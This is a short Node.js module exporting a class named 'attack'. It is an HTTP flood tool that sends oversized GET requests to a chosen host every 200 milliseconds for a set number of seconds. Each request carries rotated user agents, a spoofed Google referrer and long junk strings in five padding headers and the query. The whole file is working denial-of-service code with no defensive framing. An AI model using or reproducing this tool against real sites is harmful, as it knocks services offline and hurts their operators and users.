var Req = require('request');


class attack {
  /*
  var d = new Date(getNow());
    var h = (d.getHours());
    var m = (d.getMinutes());
    var s = (d.getSeconds());
    console.log(`${h}:${m}:${s}`);
    */

    constructor(host) {
    host = getUrl(host);
        this.host = host;
      }


blow() {

  var headers = {
  'user-agent':getUserAgent(),
  'Content-Type':'application/x-www-form-urlencoded',
  'referrer':'https://www.google.com/q='+getH(),
  'x-cross-1':getH(),
  'x-cross-2':getH(),
  'x-cross-3':getH(),
  'x-cross-4':getH(),
  'x-cross-5':getH()
  }
      var options = {
        url:this.host+'?q='+getH(1),
        headers:headers
      }
      Req.get(options,function (err, response, body) {
        if (err) {
            console.log(err);
          return;
        }
          console.log(response.statusCode);

      });



}

start(s) {
  var self = this;
  this.s = s;
  this.t = (new Date).getTime();
this.run =  setInterval(function () {
    self.blow();
    var time = ((new Date).getTime() - self.t)/1000;
    if (time >= self.s)
      clearInterval(self.run);
  },200);
}



}



function getUrl(host) {
  host +='/';
  return host.replace(/\/+$/,'/');
}

function getUserAgent() {
  var users = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19',
    'Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19',
    'Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13',
    'Mozilla/5.0 (PlayBook; U; RIM Tablet OS 2.1.0; en-US) AppleWebKit/536.2+ (KHTML, like Gecko) Version/7.2.1.0 Safari/536.2+'
  ]

  return users[Math.floor(Math.random() * users.length)];
}


function getH(n) {
  return ('2467zzasSSSLlKKFKKHKHKGKKK9596999').repeat(n || 50);
}

module.exports = attack;
